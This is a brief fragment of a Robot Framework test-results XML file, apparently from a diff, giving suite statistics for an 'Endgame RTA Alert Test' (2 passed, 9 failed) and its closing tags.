+<stat fail="9" id="s1" name="Endgame RTA Alert Test" pass="2">Endgame RTA Alert Test</stat>
+</suite>
+</statistics>
+<errors>
+</errors>
+</robot>
